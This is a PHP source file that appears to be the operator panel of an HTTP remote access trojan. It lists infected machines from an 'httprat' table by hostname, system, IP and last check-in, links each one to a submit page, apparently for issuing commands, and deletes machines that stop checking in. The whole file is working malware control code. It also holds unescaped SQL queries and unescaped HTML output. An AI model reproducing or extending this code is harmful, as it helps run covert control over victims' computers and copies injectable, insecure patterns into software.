<?php
require("config.php");
$mysqli = new mysqli($dbaddr,$username,$password,$dbname);
if(mysqli_connect_error())
{
	printf("数据库连接失败：%s\n",mysqli_connect_error());
	exit();

}

if (isset($_SESSION["admin"]))
{
	echo 
	'<table class="table">
		<thead>
			<tr><th>Computer_id</th><th>Version</th><th>HostName</th><th>System</th><th>IP Address</th><th>Last Sign-in Time</th></tr>
		</thead>';


	$timenow = time();
	$result = $mysqli->query("SELECT * FROM httprat");
	while($row = $result->fetch_assoc())
	{
			$lasttime = $row["lasttime"];
			if (($timenow - strtotime($lasttime)) <= 200)
			{   
				echo 
				'<tr>
					<td><a href="submit.php?id='.$row["id"].'">'.$row["id"].'</a></td>
					<td>'.$row["ver"].'</td><td>'.$row["name"].'</td>
					<td>'.$row["system"].'</td><td>'.$row["IP"].'</td>
					<td>'.$row["lasttime"].'</td>
				</tr>';
			}
			else
			   {$mysqli->query('delete FROM httprat where id='.$row["id"]);}
	}
	$result->close();
}

$mysqli->close();


?>